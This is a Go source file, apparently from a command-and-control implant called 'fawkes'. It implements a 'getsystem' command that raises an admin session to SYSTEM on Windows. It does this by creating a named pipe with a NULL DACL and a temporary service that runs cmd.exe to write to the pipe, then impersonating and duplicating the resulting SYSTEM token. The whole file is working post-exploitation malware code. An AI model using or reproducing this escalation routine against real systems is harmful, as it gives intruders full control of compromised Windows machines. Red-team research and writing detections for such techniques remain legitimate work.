//go:build windows
// +build windows

package commands

import (
	"crypto/rand"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"os"
	"runtime"
	"strings"
	"unsafe"

	"fawkes/pkg/structs"

	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/svc/mgr"
)

// Windows API procedures for named pipe impersonation
var (
	procCreateNamedPipeW           = kernel32.NewProc("CreateNamedPipeW")
	procConnectNamedPipe           = kernel32.NewProc("ConnectNamedPipe")
	procDisconnectNamedPipe        = kernel32.NewProc("DisconnectNamedPipe")
	procImpersonateNamedPipeClient = kernel32.NewProc("ImpersonateNamedPipeClient")
)

// Named pipe constants
const (
	PIPE_ACCESS_DUPLEX       = 0x00000003
	PIPE_TYPE_BYTE           = 0x00000000
	PIPE_READMODE_BYTE       = 0x00000000
	PIPE_WAIT                = 0x00000000
	PIPE_UNLIMITED_INSTANCES = 255
)

type GetSystemCommand struct{}

func (c *GetSystemCommand) Name() string {
	return "getsystem"
}

func (c *GetSystemCommand) Description() string {
	return "Elevate to SYSTEM via named pipe impersonation (requires SeImpersonate privilege)"
}

type getSystemArgs struct {
	Technique string `json:"technique"`
}

func (c *GetSystemCommand) Execute(task structs.Task) structs.CommandResult {
	var args getSystemArgs
	if task.Params != "" {
		if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
			return structs.CommandResult{
				Output:    fmt.Sprintf("Failed to parse parameters: %v", err),
				Status:    "error",
				Completed: true,
			}
		}
	}

	// Default to service trigger
	if args.Technique == "" {
		args.Technique = "service"
	}

	// Get current identity before escalation
	oldIdentity, _ := GetCurrentIdentity()

	switch strings.ToLower(args.Technique) {
	case "service":
		return getSystemViaService(oldIdentity)
	default:
		return structs.CommandResult{
			Output:    fmt.Sprintf("Unknown technique: %s. Available: service", args.Technique),
			Status:    "error",
			Completed: true,
		}
	}
}

// createPermissiveSA creates a SECURITY_ATTRIBUTES with a NULL DACL,
// allowing any process (including SYSTEM) to connect to the pipe.
func createPermissiveSA() (*windows.SecurityAttributes, *windows.SECURITY_DESCRIPTOR, error) {
	sd, err := windows.NewSecurityDescriptor()
	if err != nil {
		return nil, nil, fmt.Errorf("NewSecurityDescriptor: %v", err)
	}

	// Set a NULL DACL — allows all access
	if err := sd.SetDACL(nil, true, false); err != nil {
		return nil, nil, fmt.Errorf("SetDACL: %v", err)
	}

	sa := &windows.SecurityAttributes{
		Length:             uint32(unsafe.Sizeof(windows.SecurityAttributes{})),
		SecurityDescriptor: sd,
		InheritHandle:      0,
	}
	return sa, sd, nil
}

// getSystemViaService creates a named pipe, creates a Windows service whose
// binpath writes to that pipe (running as SYSTEM), then impersonates the
// connecting client to obtain a SYSTEM token.
func getSystemViaService(oldIdentity string) structs.CommandResult {
	// Lock OS thread — ImpersonateNamedPipeClient and OpenThreadToken
	// must run on the same OS thread
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()

	// Generate random pipe name
	pipeName, err := randomPipeName()
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Failed to generate pipe name: %v", err),
			Status:    "error",
			Completed: true,
		}
	}
	pipeFullPath := `\\.\pipe\` + pipeName

	// Create permissive security descriptor (NULL DACL) to allow SYSTEM to connect
	sa, _, err := createPermissiveSA()
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Failed to create security descriptor: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	// Create an event for overlapped I/O
	hEvent, _, eventErr := procCreateEventW.Call(0, 1, 0, 0) // manual reset, initially non-signaled
	if hEvent == 0 {
		return structs.CommandResult{
			Output:    fmt.Sprintf("CreateEventW failed: %v", eventErr),
			Status:    "error",
			Completed: true,
		}
	}
	defer windows.CloseHandle(windows.Handle(hEvent))

	// Create named pipe with overlapped I/O for proper timeout support
	pipeNamePtr, err := windows.UTF16PtrFromString(pipeFullPath)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Failed to create pipe name: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	hPipe, _, pipeErr := procCreateNamedPipeW.Call(
		uintptr(unsafe.Pointer(pipeNamePtr)),
		PIPE_ACCESS_DUPLEX|FILE_FLAG_OVERLAPPED,
		PIPE_TYPE_BYTE|PIPE_READMODE_BYTE|PIPE_WAIT,
		PIPE_UNLIMITED_INSTANCES,
		512,  // out buffer size
		512,  // in buffer size
		5000, // default timeout (5s)
		uintptr(unsafe.Pointer(sa)),
	)
	if hPipe == uintptr(windows.InvalidHandle) {
		return structs.CommandResult{
			Output:    fmt.Sprintf("CreateNamedPipeW failed: %v", pipeErr),
			Status:    "error",
			Completed: true,
		}
	}
	defer windows.CloseHandle(windows.Handle(hPipe))

	// Start overlapped ConnectNamedPipe BEFORE creating the service
	// This ensures we're listening when the service starts
	overlapped := windows.Overlapped{
		HEvent: windows.Handle(hEvent),
	}
	ret, _, connectErr := procConnectNamedPipe.Call(
		hPipe,
		uintptr(unsafe.Pointer(&overlapped)),
	)
	if ret == 0 {
		// Expected: ERROR_IO_PENDING means waiting for connection
		// ERROR_PIPE_CONNECTED means client already connected
		if connectErr != windows.ERROR_IO_PENDING && connectErr != windows.ERROR_PIPE_CONNECTED {
			return structs.CommandResult{
				Output:    fmt.Sprintf("ConnectNamedPipe failed: %v", connectErr),
				Status:    "error",
				Completed: true,
			}
		}
	}

	alreadyConnected := (connectErr == windows.ERROR_PIPE_CONNECTED)

	// Create a temporary service that writes to our pipe
	// Full path to cmd.exe avoids PATH lookup issues under SCM
	svcName := "fwk" + pipeName[:8]
	systemRoot := os.Getenv("SystemRoot")
	if systemRoot == "" {
		systemRoot = `C:\Windows`
	}
	binPath := fmt.Sprintf(`"%s\System32\cmd.exe" /c echo fawkes > %s`, systemRoot, pipeFullPath)

	scm, err := mgr.Connect()
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Failed to connect to SCM: %v (need admin privileges)", err),
			Status:    "error",
			Completed: true,
		}
	}
	defer scm.Disconnect()

	svcHandle, err := scm.CreateService(svcName, binPath, mgr.Config{
		StartType:    uint32(mgr.StartManual),
		ErrorControl: mgr.ErrorIgnore,
	})
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Failed to create service '%s': %v (need admin privileges)", svcName, err),
			Status:    "error",
			Completed: true,
		}
	}

	// Ensure service is cleaned up
	defer func() {
		svcHandle.Delete()
		svcHandle.Close()
	}()

	// Start the service — the SCM will run cmd.exe as SYSTEM which connects to our pipe
	startErr := svcHandle.Start()
	// Expected to error because cmd.exe is not a real service, but it still runs the binary

	// Wait for the pipe connection (overlapped I/O)
	if !alreadyConnected {
		waitResult, _ := windows.WaitForSingleObject(windows.Handle(hEvent), 10000) // 10s timeout
		if waitResult != windows.WAIT_OBJECT_0 {
			return structs.CommandResult{
				Output:    fmt.Sprintf("Timeout waiting for service to connect to pipe (10s). Ensure you have SeImpersonate and admin privileges. Service: %s, binpath: %s, startErr: %v", svcName, binPath, startErr),
				Status:    "error",
				Completed: true,
			}
		}
	}

	// Impersonate the connected client (SYSTEM)
	ret, _, err = procImpersonateNamedPipeClient.Call(hPipe)
	if ret == 0 {
		return structs.CommandResult{
			Output:    fmt.Sprintf("ImpersonateNamedPipeClient failed: %v (need SeImpersonate privilege)", err),
			Status:    "error",
			Completed: true,
		}
	}

	// Get the impersonation token from current thread
	var threadToken windows.Token
	err = windows.OpenThreadToken(windows.CurrentThread(), windows.TOKEN_ALL_ACCESS, true, &threadToken)
	if err != nil {
		procRevertToSelf.Call()
		return structs.CommandResult{
			Output:    fmt.Sprintf("OpenThreadToken failed after impersonation: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	// Duplicate to a primary token for full use
	var primaryToken windows.Token
	err = windows.DuplicateTokenEx(
		threadToken,
		windows.MAXIMUM_ALLOWED,
		nil,
		windows.SecurityImpersonation,
		windows.TokenPrimary,
		&primaryToken,
	)
	threadToken.Close()

	if err != nil {
		procRevertToSelf.Call()
		return structs.CommandResult{
			Output:    fmt.Sprintf("DuplicateTokenEx failed: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	// Revert before storing (SetIdentityToken will call ImpersonateLoggedOnUser)
	procRevertToSelf.Call()

	// Disconnect pipe client
	procDisconnectNamedPipe.Call(hPipe)

	// Store the SYSTEM token using existing token infrastructure
	if err := SetIdentityToken(primaryToken); err != nil {
		windows.CloseHandle(windows.Handle(primaryToken))
		return structs.CommandResult{
			Output:    fmt.Sprintf("Failed to impersonate SYSTEM token: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	// Verify the new identity
	newIdentity, err := GetCurrentIdentity()
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("SYSTEM token obtained but failed to verify: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	var sb strings.Builder
	sb.WriteString("Successfully elevated to SYSTEM\n")
	sb.WriteString("Technique: Service named pipe impersonation\n")
	if oldIdentity != "" {
		sb.WriteString(fmt.Sprintf("Old: %s\n", oldIdentity))
	}
	sb.WriteString(fmt.Sprintf("New: %s\n", newIdentity))
	sb.WriteString(fmt.Sprintf("Service '%s' created and deleted\n", svcName))
	sb.WriteString("Use rev2self to revert to original context")

	return structs.CommandResult{
		Output:    sb.String(),
		Status:    "success",
		Completed: true,
	}
}

// randomPipeName generates a random pipe name using crypto/rand
func randomPipeName() (string, error) {
	b := make([]byte, 8)
	if _, err := rand.Read(b); err != nil {
		return "", err
	}
	return hex.EncodeToString(b), nil
}
